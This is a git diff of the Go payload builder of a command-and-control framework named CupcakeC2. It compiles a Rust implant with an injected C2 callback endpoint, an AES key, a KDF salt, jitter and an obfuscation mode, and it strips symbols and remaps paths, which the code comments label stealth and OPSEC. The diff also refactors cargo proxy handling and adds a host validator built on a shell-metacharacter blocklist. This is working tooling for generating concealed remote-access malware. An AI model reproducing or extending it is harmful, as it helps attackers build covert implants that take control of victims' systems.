@@ -2,8 +2,6 @@ package services
 
 import (
 	"bufio"
-	"cupcake-server/pkg/store"
-	"cupcake-server/pkg/utils"
 	"fmt"
 	"io"
 	"os"
@@ -11,6 +9,11 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"time"
+
+	"cupcake-server/pkg/store"
+	"cupcake-server/pkg/utils"
+
 	"github.com/google/uuid"
 )
 
@@ -66,6 +69,173 @@ func copyDir(src, dst string) error {
 	})
 }
 
+// validateC2Host ensures the C2 callback host is a valid hostname or IP:port,
+// without path separators or shell metacharacters that could cause code injection.
+func validateC2Host(host string) error {
+	if host == "" {
+		return fmt.Errorf("C2 host is required")
+	}
+	// Reject path separators and shell metacharacters
+	bad := []string{"/", "\\", ";", "&", "|", "`", "$", "\n", "\r", "\"", "'", "<", ">", "(", ")", "{", "}", "[", "]"}
+	for _, ch := range bad {
+		if strings.Contains(host, ch) {
+			return fmt.Errorf("C2 host contains invalid character: %q", ch)
+		}
+	}
+	return nil
+}
+
+const isolatedCargoHome = "./storage/build_cache/cargo_home"
+
+// ensureIsolatedCargoHome creates a CARGO_HOME that ignores user ~/.cargo/config.toml
+// (which often forces replace-with=ustc behind a dead 127.0.0.1 proxy), while reusing
+// the user's registry/git caches via directory junctions (Windows) or symlinks.
+func ensureIsolatedCargoHome(logChan chan<- string) (string, error) {
+	home, err := filepath.Abs(isolatedCargoHome)
+	if err != nil {
+		return "", err
+	}
+	if err := os.MkdirAll(home, 0755); err != nil {
+		return "", err
+	}
+	cfg := `# Isolated Cupcake build CARGO_HOME — no crates-io replace-with.
+# Registry cache is linked from the user cargo home when available.
+[registries.crates-io]
+protocol = "sparse"
+
+[net]
+git-fetch-with-cli = true
+`
+	if err := os.WriteFile(filepath.Join(home, "config.toml"), []byte(cfg), 0644); err != nil {
+		return "", err
+	}
+
+	userCargo := os.Getenv("CARGO_HOME")
+	if userCargo == "" {
+		if up := os.Getenv("USERPROFILE"); up != "" {
+			userCargo = filepath.Join(up, ".cargo")
+		} else if h := os.Getenv("HOME"); h != "" {
+			userCargo = filepath.Join(h, ".cargo")
+		}
+	}
+	for _, name := range []string{"registry", "git"} {
+		src := filepath.Join(userCargo, name)
+		dst := filepath.Join(home, name)
+		if _, err := os.Stat(src); err != nil {
+			continue
+		}
+		if fi, err := os.Lstat(dst); err == nil {
+			// Already present (junction/dir) — keep
+			_ = fi
+			continue
+		}
+		if err := linkCargoCacheDir(src, dst); err != nil {
+			if logChan != nil {
+				logChan <- fmt.Sprintf("[Builder] 警告: 无法链接 cargo %s 缓存 (%v)，将使用独立缓存", name, err)
+			}
+		} else if logChan != nil {
+			logChan <- fmt.Sprintf("[Builder] 已链接用户 cargo/%s 缓存 → 隔离 CARGO_HOME", name)
+		}
+	}
+	return home, nil
+}
+
+func linkCargoCacheDir(src, dst string) error {
+	// Prefer Windows junction (no admin); fall back to symlink / plain copy skip.
+	if runtime.GOOS == "windows" {
+		cmd := exec.Command("cmd", "/C", "mklink", "/J", dst, src)
+		if out, err := cmd.CombinedOutput(); err != nil {
+			return fmt.Errorf("mklink /J: %v (%s)", err, strings.TrimSpace(string(out)))
+		}
+		return nil
+	}
+	return os.Symlink(src, dst)
+}
+
+// cargoBuildEnv builds a clean environment for cargo: isolated CARGO_HOME, no dead proxies.
+func cargoBuildEnv(absTargetDir, absWorkspace, cargoHome string) []string {
+	base := os.Environ()
+	strip := map[string]bool{
+		"HTTP_PROXY": true, "HTTPS_PROXY": true, "ALL_PROXY": true,
+		"http_proxy": true, "https_proxy": true, "all_proxy": true,
+		"FTP_PROXY": true, "ftp_proxy": true,
+		"CARGO_HOME": true, // replace below
+	}
+	out := make([]string, 0, len(base)+16)
+	for _, kv := range base {
+		eq := strings.IndexByte(kv, '=')
+		if eq <= 0 {
+			continue
+		}
+		key := kv[:eq]
+		if strip[key] || strip[strings.ToUpper(key)] {
+			continue
+		}
+		out = append(out, kv)
+	}
+	wireSeed := utils.WireSeed()
+	// Neutral remap prefixes (no product brand in debug paths)
+	out = append(out,
+		"HTTP_PROXY=",
+		"HTTPS_PROXY=",
+		"ALL_PROXY=",
+		"http_proxy=",
+		"https_proxy=",
+		"all_proxy=",
+		"CARGO_TERM_COLOR=never",
+		"CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse",
+		fmt.Sprintf("CARGO_HOME=%s", cargoHome),
+		fmt.Sprintf("CARGO_TARGET_DIR=%s", absTargetDir),
+		fmt.Sprintf("CUPCAKE_WIRE_SEED=%s", wireSeed),
+		fmt.Sprintf("RUSTFLAGS=-C strip=symbols --remap-path-prefix %s=/src --remap-path-prefix %s=/home", absWorkspace, os.Getenv("USERPROFILE")),
+	)
+	return out
+}
+
+// runCargoBuild starts cargo with streaming logs; returns wait error.
+func runCargoBuild(workspace string, args []string, env []string, logChan chan<- string) error {
+	cmd := exec.Command("cargo", args...)
+	cmd.Dir = workspace
+	cmd.Env = env
+
+	pipeReader, pipeWriter := io.Pipe()
+	cmd.Stdout = pipeWriter
+	cmd.Stderr = pipeWriter
+
+	if logChan != nil {
+		logChan <- fmt.Sprintf("[Builder] 执行命令: cargo %s", strings.Join(args, " "))
+	}
+
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("failed to start cargo: %v", err)
+	}
+
+	go func() {
+		scanner := bufio.NewScanner(pipeReader)
+		// cargo lines can be long
+		buf := make([]byte, 0, 64*1024)
+		scanner.Buffer(buf, 1024*1024)
+		for scanner.Scan() {
+			line := scanner.Text()
+			if logChan != nil {
+				select {
+				case logChan <- line:
+				default:
+				}
+				if strings.Contains(line, "Compiling") && strings.Contains(line, "cupcake-core") {
+					logChan <- "\x1b[35m[Builder] 编译阶段基本完成，正在进入全局链接与 LTO 体积优化阶段...\x1b[0m"
+					logChan <- "\x1b[33m[Builder] 提示：该步涉及跨模块重组，耗时较长（约 30s），请耐心等待窗口自动弹出。\x1b[0m"
+				}
+			}
+		}
+		pipeReader.Close()
+	}()
+
+	waitErr := cmd.Wait()
+	pipeWriter.Close()
+	return waitErr
+}
+
 // BuildAgentWithLogger compiles the Rust agent in a sandboxed environment and streams logs
 func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, error) {
 	buildID := uuid.New().String()
@@ -81,6 +251,19 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 	}
 	defer os.RemoveAll(workspace)
 
+	cargoHome, err := ensureIsolatedCargoHome(logChan)
+	if err != nil {
+		return "", fmt.Errorf("failed to prepare isolated CARGO_HOME: %v", err)
+	}
+	if logChan != nil {
+		logChan <- "[Builder] 使用隔离 CARGO_HOME（忽略用户 ustc 镜像）；已清除 HTTP(S)_PROXY"
+	}
+
+	// 安全校验：防止 C2 Host 注入恶意内容到 Rust 源码
+	if err := validateC2Host(conf.Host); err != nil {
+		return "", fmt.Errorf("invalid C2 host: %v", err)
+	}
+
 	var connStr string
 	protocol := strings.ToLower(conf.Protocol)
 	if protocol == "tcp" {
@@ -95,19 +278,38 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 		connStr = fmt.Sprintf("ws://%s:%s/ws", conf.Host, conf.Port)
 	}
 
-	if logChan != nil { logChan <- "[Builder] CupcakeC2 v3.0.5 核心引擎初始化..." }
+	if logChan != nil {
+		logChan <- "[Builder] core engine init"
+		logChan <- fmt.Sprintf("[Builder] wire_seed=%s (magics/Noise/module domain)", utils.WireSeed())
+	}
 
 	configPath := filepath.Join(workspace, "core", "src", "config.rs")
-	if logChan != nil { logChan <- "[Builder] 正在注入 C2 终结点与加密配置..." }
+	if logChan != nil {
+		logChan <- "[Builder] injecting endpoint + crypto config..."
+	}
 
 	// Fetch System AES Key if none provided
 	aesKey := conf.AESKey
 	if aesKey == "" {
 		aesKey = store.GetSetting("system_aes_key")
-		if logChan != nil { logChan <- "[Builder] 密钥采用系统预设值" }
+		if logChan != nil {
+			logChan <- "[Builder] using system AES material"
+		}
+	}
+	// Per-build unique salt (PSK base AES stays listener-shared for Noise; salt isolates module KDF)
+	salt := strings.TrimSpace(conf.EncryptionSalt)
+	if salt == "" {
+		if s, err := utils.RandomAlphaString(24); err == nil {
+			salt = s
+		} else {
+			salt = fmt.Sprintf("s%016x", time.Now().UnixNano())
+		}
+		if logChan != nil {
+			logChan <- "[Builder] minted unique KDF salt for this payload"
+		}
 	}
 
-	if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.Jitter, conf.DNSResolver, conf.EncryptionSalt, conf.ObfuscationMode); err != nil {
+	if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.Jitter, conf.DNSResolver, salt, conf.ObfuscationMode); err != nil {
 		return "", fmt.Errorf("config patch failed: %v", err)
 	}
 
@@ -194,65 +396,35 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 		args = append(args, "--no-default-features", "--features", "ws,"+capProfile)
 	}
 
-	if logChan != nil { 
+	if logChan != nil {
 		modeStr := "全量构建"
-		if _, err := os.Stat(SharedTargetDir); err == nil { modeStr = "增量加速模式" }
-		logChan <- fmt.Sprintf("[Builder] 正在启动 Rust 编译器 (%s)...", modeStr) 
-		logChan <- "[Builder] 提示: 如果底层依赖已缓存，本过程将很快跳过..."
+		if _, err := os.Stat(SharedTargetDir); err == nil {
+			modeStr = "增量加速模式"
+		}
+		logChan <- fmt.Sprintf("[Builder] 正在启动 Rust 编译器 (%s)...", modeStr)
+		logChan <- "[Builder] 策略: 优先 --offline（本地 crates 缓存）→ 失败再在线拉取（已清除 HTTP_PROXY）"
 	}
 
-	cmd := exec.Command("cargo", args...)
-	cmd.Dir = workspace
-	
-	// Add parent environment and force color/progress
-	// ⚡ OPTIMIZATION: Use a centralized target directory to enable incremental compilation
-	// 🛡️ STEALTH: Remap source paths to hide local directory structure
+	// ⚡ OPTIMIZATION: centralized target dir; 🛡️ remap paths for OPSEC
 	absTargetDir, _ := filepath.Abs(SharedTargetDir)
 	absWorkspace, _ := filepath.Abs(workspace)
-	
-	cmd.Env = append(os.Environ(), 
-		"CARGO_TERM_COLOR=never",
-		fmt.Sprintf("CARGO_TARGET_DIR=%s", absTargetDir),
-		fmt.Sprintf("RUSTFLAGS=--remap-path-prefix %s=/cupcake --remap-path-prefix %s=/rust", absWorkspace, os.Getenv("USERPROFILE")),
-	)
-	
-	// Stream logs: Combine Stdout and Stderr to avoid MultiReader blocking
-	pipeReader, pipeWriter := io.Pipe()
-	cmd.Stdout = pipeWriter
-	cmd.Stderr = pipeWriter
-	
-	if logChan != nil { logChan <- fmt.Sprintf("[Builder] 执行命令: cargo %s", strings.Join(args, " ")) }
-	
-	if err := cmd.Start(); err != nil {
-		return "", fmt.Errorf("failed to start cargo: %v", err)
+	env := cargoBuildEnv(absTargetDir, absWorkspace, cargoHome)
+
+	// Offline-first: uses %USERPROFILE%\.cargo\registry (index.crates.io-*) when
+	// no user-level replace-with points at a different empty index (e.g. ustc).
+	offlineArgs := append(append([]string{}, args...), "--offline")
+	if logChan != nil {
+		logChan <- "[Builder] 尝试离线编译 (--offline)..."
 	}
-
-	// Log reader in its own goroutine
-	go func() {
-		scanner := bufio.NewScanner(pipeReader)
-		for scanner.Scan() {
-			line := scanner.Text()
-			if logChan != nil {
-				select {
-				case logChan <- line:
-				default:
-				}
-
-				// 🚀 HUMAN TOUCH: Detect when cargo reaches the linking phase
-				if strings.Contains(line, "Compiling") && strings.Contains(line, "cupcake-core") {
-					logChan <- "\x1b[35m[Builder] 编译阶段基本完成，正在进入全局链接与 LTO 体积优化阶段...\x1b[0m"
-					logChan <- "\x1b[33m[Builder] 提示：该步涉及跨模块重组，耗时较长（约 30s），请耐心等待窗口自动弹出。\x1b[0m"
-				}
-			}
-		}
-		pipeReader.Close()
-	}()
-
-	waitErr := cmd.Wait()
-	pipeWriter.Close() // This will trigger EOF on the scanner
-
+	waitErr := runCargoBuild(workspace, offlineArgs, env, logChan)
 	if waitErr != nil {
-		return "", fmt.Errorf("cargo build failed: %v", waitErr)
+		if logChan != nil {
+			logChan <- fmt.Sprintf("[Builder] 离线未成功 (%v)，改为在线编译（无系统代理）...", waitErr)
+		}
+		waitErr = runCargoBuild(workspace, args, env, logChan)
+		if waitErr != nil {
+			return "", fmt.Errorf("cargo build failed: %v；若仍访问 ustc/代理失败：检查 ~/.cargo/config.toml 的 replace-with，或运行 Client/scripts/cargo-use-local-cache.ps1", waitErr)
+		}
 	}
 
 	binaryName := "cupcake-core"
